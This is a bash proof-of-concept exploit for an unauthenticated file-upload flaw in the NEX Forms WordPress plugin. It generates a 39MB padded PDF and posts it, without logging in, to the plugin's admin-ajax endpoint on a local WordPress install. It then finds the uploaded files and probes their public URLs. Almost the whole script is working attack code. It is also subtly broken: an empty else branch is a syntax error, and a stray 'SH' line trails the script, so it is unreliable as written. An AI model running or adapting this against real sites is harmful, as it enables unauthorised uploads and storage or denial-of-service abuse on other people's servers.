#!/usr/bin/env bash
set -e

BASE="http://127.0.0.1/wordpress/"
AJAX="${BASE}wp-admin/admin-ajax.php?action=submit_nex_form"

FORM_ID="1"
SIZE_MB="39"

YEAR=$(date +%Y)
MONTH=$(date +%m)
UPLOAD_URL="${BASE}wp-content/uploads/${YEAR}/${MONTH}/"

MARKER="NEXFORMS_POC_$(date +%s)_$RANDOM"
NAME="nexforms_${MARKER}.pdf"

echo
echo "[!] NEX Forms Express WP Form Builder unauthenticated upload test"
echo "[!] This PoC uploads a ${SIZE_MB}MB PDF without authentication."
echo "[!] Use only on your own local/lab WordPress."
echo

echo "[+] Creating ${SIZE_MB}MB test PDF: $NAME"
dd if=/dev/zero of="$NAME" bs=1M count="$SIZE_MB" status=progress

echo "%PDF-1.4" | cat - "$NAME" > "${NAME}.tmp"
mv "${NAME}.tmp" "$NAME"

echo
echo "[+] Getting uploads before test..."
BEFORE=$(find wp-content/uploads -type f 2>/dev/null | sort || true)

echo
echo "[+] Uploading without authentication..."
RESP=$(curl -s -i -X POST "$AJAX" \
  -F "nex_forms_Id=${FORM_ID}" \
  -F "nex_forms_upload_file=@./${NAME};type=application/pdf")

echo "$RESP"
echo

ENTRY_ID=$(echo "$RESP" | grep -oE 'nf_entry_id" value="[0-9]+' | grep -oE '[0-9]+' | tail -1 || true)

if [ -n "$ENTRY_ID" ]; then
  echo "[+] Form entry created unauthenticated: nf_entry_id=$ENTRY_ID"
else
  echo "[!] Could not detect nf_entry_id, but upload may still have processed."
fi

sleep 2

echo
echo "[+] Checking new files in wp-content/uploads..."
AFTER=$(find wp-content/uploads -type f 2>/dev/null | sort || true)

NEW_FILES=$(comm -13 <(echo "$BEFORE") <(echo "$AFTER") || true)

if [ -n "$NEW_FILES" ]; then
  echo "[+] New file(s) found:"
  echo "$NEW_FILES"
  echo

  echo "[+] Public URL guesses:"
  echo "$NEW_FILES" | while read -r f; do
    rel="${f#wp-content/uploads/}"
    url="${BASE}wp-content/uploads/${rel}"
    echo "$url"
    curl -s -I "$url" | head -5
    echo
  done
else

fi

echo
echo "[+] Cleanup local generated file:"
echo "rm -f $NAME"
SH
